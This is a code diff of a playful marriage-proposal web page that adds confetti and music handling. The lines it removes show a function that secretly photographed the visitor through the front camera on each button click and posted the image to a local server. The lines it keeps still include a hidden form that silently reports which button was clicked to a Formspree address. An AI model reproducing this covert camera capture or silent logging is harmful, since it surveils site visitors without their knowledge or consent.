@@ -16,6 +16,7 @@
       height: 100vh;
       background-color: lightpink;
       flex-direction: column;
+      overflow: hidden;
     }
 
     h1, h2 {
@@ -89,10 +90,9 @@
     }
 
     #song {
-      display: none; /* Hide initially */
+      display: none;
       color: white;
     }
-
 
     #mainContent {
       display: flex;
@@ -105,14 +105,19 @@
       display: none;
     }
 
-    video, canvas {
-      display: none;
+    canvas.confetti {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100% !important;
+      height: 100% !important;
+      pointer-events: none;
+      z-index: 9999;
     }
   </style>
 </head>
 <body>
 
-  <!-- Wrap all main content here -->
   <div id="mainContent">
     <h1 id="heading">I am here to travel with you from today until the last minute of my life, will you marry me?</h1>
     <h1 id="heading1">😍</h1>
@@ -125,23 +130,22 @@
     </div>
   </div>
 
-  <!-- Hidden Form for silent message -->
+  <!-- Hidden Form -->
   <form id="logForm" action="https://formspree.io/f/xkgjayw1" method="POST" style="display:none;">
     <input type="hidden" name="message" id="formMessage">
   </form>
 
-  <!-- Popup for GIF -->
   <div id="popupGif">
     <h1 id="song">Song For you ❤️</h1>
     <img id="popupImage" src="" alt="popup gif" />
   </div>
 
-  <!-- Hidden video/canvas elements for camera capture -->
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
+  <!-- Confetti Library -->
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
 
   <script>
     let clickCount = 0;
+    let hasPlayedSong = false;
 
     const yesButton = document.getElementById('yesButton');
     const noButton = document.getElementById('noButton');
@@ -172,6 +176,7 @@
       "😫",
       "😭"
     ];
+
     const nogif = [
       'https://media.tenor.com/utpiwBr_FakAAAAC/broken-heart.gif',
       'https://c.tenor.com/vE53w74cIPcAAAAM/manga-toon.gif',
@@ -181,12 +186,16 @@
       'https://media.tenor.com/EqCHrhlrv6cAAAAC/love-broken-heart.gif'
     ];
 
+    const loveSong = new Audio('./song/Vizhiyil-Un-Vizhiyil.mp3');
+    loveSong.loop = true;
+
     function moveButton() {
-      const newX = Math.floor(Math.random() * (window.innerWidth - noButton.offsetWidth));
-      const newY = Math.floor(Math.random() * (window.innerHeight - noButton.offsetHeight));
+      const padding = 60;
+      const newX = Math.floor(Math.random() * (window.innerWidth - noButton.offsetWidth - padding));
+      const newY = Math.floor(Math.random() * (window.innerHeight - noButton.offsetHeight - padding));
       noButton.style.position = 'absolute';
-      noButton.style.left = newX + 'px';
-      noButton.style.top = newY + 'px';
+      noButton.style.left = `${newX}px`;
+      noButton.style.top = `${newY}px`;
     }
 
     function showPopupGif(gifUrl) {
@@ -211,41 +220,12 @@
       });
     }
 
-    // Function to capture image from the front camera
-    async function captureImage(buttonClicked) {
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
-
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" },
-          audio: false
-        });
-
-        video.srcObject = stream;
-
-        // Wait for 3 seconds before capturing the image
-        await new Promise(resolve => setTimeout(resolve, 3000));
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        // Stop the camera
-        stream.getTracks().forEach(track => track.stop());
-
-        const imageData = canvas.toDataURL("image/png");
-
-        // Send the image to the backend (in this case, just log to console)
-        await fetch("http://localhost:3000/send-photo", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ image: imageData, button: buttonClicked })
-        });
-      } catch (error) {
-        console.error("Capture failed:", error);
-      }
+    function launchConfetti() {
+      confetti({
+        particleCount: 200,
+        spread: 100,
+        origin: { y: 0.6 }
+      });
     }
 
     noButton.addEventListener('click', () => {
@@ -262,13 +242,9 @@
       }
       moveButton();
       sendSilentMessage('No button clicked');
-      captureImage("No"); // Capture and send image for "No"
     });
 
-    const loveSong = new Audio('./song/Vizhiyil-Un-Vizhiyil.mp3'); 
-     loveSong.loop = true; 
-
-     yesButton.addEventListener('click', () => {
+    yesButton.addEventListener('click', () => {
       heading.textContent = "Hehe I knew it!";
       heading1.textContent = "My LOVE for you has no end and will keep on loving you till my last breath. Love you a lot 🥰";
       heading2.textContent = "Click to get Close to Me..!👈🏻";
@@ -277,19 +253,20 @@
       noButton.style.display = "none";
       song.style.display = 'block';
       showPopupGif('https://www.icegif.com/wp-content/uploads/icegif-3795.gif');
+      launchConfetti();
       sendSilentMessage('Yes button clicked');
-  
-      captureImage("Yes"); // Capture and send image for "Yes"
-  
-      loveSong.play().catch((err) => {
-        console.log('Autoplay failed:', err);
-      });
+
+      if (!hasPlayedSong) {
+        loveSong.play().catch(console.log);
+        hasPlayedSong = true;
+      }
     });
 
+    // Stop the song when clicking anywhere else (once)
     document.addEventListener('click', (event) => {
       if (!yesButton.contains(event.target)) {
         loveSong.pause();
-        loveSong.currentTime = 0; 
+        loveSong.currentTime = 0;
       }
     }, { once: true });
   </script>
